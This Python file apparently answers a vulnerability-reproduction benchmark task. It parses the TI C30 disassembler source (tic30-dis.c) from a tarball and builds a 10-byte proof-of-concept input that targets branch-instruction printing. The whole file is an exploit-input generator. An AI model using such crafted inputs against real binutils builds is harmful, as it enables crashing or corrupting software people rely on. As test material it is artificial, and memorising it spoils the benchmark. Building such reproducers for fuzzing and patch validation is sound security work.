import os
import re
import tarfile
import tempfile
import shutil


class Solution:
    def solve(self, src_path: str) -> bytes:
        tmpdir = None
        try:
            tmpdir = tempfile.mkdtemp(prefix="poc_tic30_")
            try:
                with tarfile.open(src_path, "r:*") as tf:
                    tf.extractall(tmpdir)
            except Exception:
                # If extraction fails, return a generic aggressive pattern
                return b"\xff" * 10

            tic30_dis_path = self._find_file(tmpdir, "tic30-dis.c")
            if not tic30_dis_path:
                return b"\xff" * 10

            try:
                with open(tic30_dis_path, "r", errors="ignore") as f:
                    content = f.read()
            except Exception:
                return b"\xff" * 10

            content_nc = self._strip_comments(content)
            defines = self._parse_defines(content_nc)
            insn = self._find_branch_instruction_value(content_nc, defines)

            if insn is None:
                # If we couldn't parse a valid instruction, fall back to a generic pattern
                return b"\xff" * 10

            insn &= 0xFFFFFFFF

            # Produce both little and big endian encodings.
            le = insn.to_bytes(4, "little", signed=False)
            be = insn.to_bytes(4, "big", signed=False)

            # Construct a 10-byte PoC: 4 (LE) + 4 (BE) + 2 padding
            poc = le + be + b"\x00\x00"
            return poc[:10]
        finally:
            if tmpdir and os.path.isdir(tmpdir):
                shutil.rmtree(tmpdir, ignore_errors=True)

    def _find_file(self, root: str, filename: str) -> str:
        for dirpath, _, filenames in os.walk(root):
            for fn in filenames:
                if fn == filename:
                    return os.path.join(dirpath, fn)
        return ""

    def _strip_comments(self, s: str) -> str:
        # Remove C block comments
        s = re.sub(r"/\*.*?\*/", "", s, flags=re.S)
        # Remove C++ line comments
        s = re.sub(r"//[^\n]*", "", s)
        return s

    def _parse_defines(self, s: str) -> dict:
        defines = {}
        # Simple defines only; skip function-like macros
        for m in re.finditer(r"^[ \t]*#[ \t]*define[ \t]+([A-Za-z_]\w*)(?:\s+(.+))?$", s, flags=re.M):
            name = m.group(1)
            rest = m.group(2) or ""
            if "(" in name:  # function-like
                continue
            # Strip trailing comments on the same line
            rest = rest.split("\n", 1)[0].strip()
            # Remove backslash continuations for simple numeric macros
            if rest.endswith("\\"):
                # Join subsequent lines until continuation ends
                start = m.end()
                accum = [rest[:-1]]
                idx = start
                while True:
                    nl = s.find("\n", idx)
                    if nl == -1:
                        break
                    line = s[idx:nl]
                    idx = nl + 1
                    line_stripped = line.strip()
                    if line_stripped.endswith("\\"):
                        accum.append(line_stripped[:-1])
                        continue
                    else:
                        accum.append(line_stripped)
                        break
                rest = " ".join(accum)
            val = self._eval_numeric(rest, defines)
            if val is not None:
                defines[name] = val & 0xFFFFFFFFFFFFFFFF  # store as unsigned
        return defines

    def _eval_numeric(self, expr: str, defines: dict):
        if not expr:
            return None
        # Remove trailing commas and braces accidentally captured
        expr = expr.strip().strip(",")
        # Remove casts like (unsigned), (int), etc.
        expr = re.sub(r"\([ \t]*[A-Za-z_]\w*(?:[ \t]*\*)?[ \t]*\)", "", expr)
        # Remove suffixes U, L from numbers
        expr = re.sub(r"([0-9]+|0x[0-9A-Fa-f]+)[UuLl]+", r"\1", expr)
        # If ternary operator present, skip
        if "?" in expr or ":" in expr:
            return None
        # Only allow safe chars: digits, hex letters, ops, whitespace, x
        if not re.fullmatch(r"[0-9xXa-fA-F\(\)\|\&\~\^\<\>\+\-\*\/\s]+|[A-Za-z_]\w+(?:\s*[\|\&\~\^\<\>\+\-\*\/]\s*[A-Za-z_]\w+)*", expr):
            # Attempt to substitute known macros and re-check
            expr_sub = self._replace_macros(expr, defines)
            if expr_sub == expr:
                return None
            expr = expr_sub
            if not re.fullmatch(r"[0-9xXa-fA-F\(\)\|\&\~\^\<\>\+\-\*\/\s]+", expr):
                return None
        else:
            expr = self._replace_macros(expr, defines)

        try:
            val = eval(expr, {"__builtins__": None}, {})
            if isinstance(val, int):
                return val
            return None
        except Exception:
            return None

    def _replace_macros(self, expr: str, defines: dict) -> str:
        def repl(m):
            name = m.group(0)
            if name in defines:
                return str(defines[name])
            return name
        return re.sub(r"\b[A-Za-z_]\w*\b", repl, expr)

    def _find_branch_instruction_value(self, s: str, defines: dict):
        # Find entries that reference print_branch
        candidates = []
        for m in re.finditer(r"\bprint_branch\b", s):
            # Get enclosing braces for the table entry
            start = s.rfind("{", 0, m.start())
            end = s.find("}", m.end())
            if start == -1 or end == -1 or end <= start:
                continue
            entry = s[start + 1:end]
            fields = self._split_top_level_commas(entry)
            # Identify index of field containing print_branch
            idxs = [i for i, f in enumerate(fields) if re.search(r"\bprint_branch\b", f)]
            if not idxs:
                continue
            idx = idxs[0]

            # Collect previous fields that are numeric expressions; try to get two preceding numeric fields
            nums = []
            j = idx - 1
            while j >= 0 and len(nums) < 2:
                val = self._eval_numeric(fields[j].strip(), defines)
                if val is not None:
                    nums.append(val & 0xFFFFFFFF)
                j -= 1
            if len(nums) < 2:
                continue
            # nums collected in reverse order: [last, second last] before handler
            a, b = nums[1], nums[0]

            # Try to determine which is match and which is mask by checking (match & mask) == match
            arrangements = []
            if (a & b) == a:
                arrangements.append((a, b))
            if (b & a) == b and (b, a) not in arrangements:
                arrangements.append((b, a))
            if not arrangements:
                # Heuristic: pick the one with fewer set bits as match (opcode), and the other as mask
                pa, pb = self._popcount(a), self._popcount(b)
                if pa <= pb:
                    arrangements.append((a, b))
                else:
                    arrangements.append((b, a))

            # Select the best arrangement
            match, mask = arrangements[0]

            # Compute an instruction that sets all non-masked bits to 1 to maximize operands variability
            insn = (match | (~mask & 0xFFFFFFFF)) & 0xFFFFFFFF
            candidates.append(insn)

        if not candidates:
            return None

        # Prefer instructions with more zero bits in mask (thus more non-masked bits to set),
        # which we approximated by evaluating from entry; we don't have mask directly here.
        # As a proxy, choose the instruction with most set bits (aggressive fields).
        best = max(candidates, key=lambda x: self._popcount(x))
        return best

    def _split_top_level_commas(self, s: str):
        items = []
        cur = []
        depth_par = 0
        depth_brace = 0
        depth_bracket = 0
        in_str = False
        esc = False
        quote_char = ""
        for ch in s:
            if in_str:
                cur.append(ch)
                if esc:
                    esc = False
                elif ch == "\\":
                    esc = True
                elif ch == quote_char:
                    in_str = False
                continue

            if ch in ("'", '"'):
                in_str = True
                quote_char = ch
                cur.append(ch)
                continue

            if ch == "(":
                depth_par += 1
            elif ch == ")":
                depth_par = max(0, depth_par - 1)
            elif ch == "{":
                depth_brace += 1
            elif ch == "}":
                depth_brace = max(0, depth_brace - 1)
            elif ch == "[":
                depth_bracket += 1
            elif ch == "]":
                depth_bracket = max(0, depth_bracket - 1)
            elif ch == "," and depth_par == 0 and depth_brace == 0 and depth_bracket == 0:
                items.append("".join(cur).strip())
                cur = []
                continue
            cur.append(ch)
        if cur:
            items.append("".join(cur).strip())
        return items

    def _popcount(self, x: int) -> int:
        return bin(x & 0xFFFFFFFF).count("1")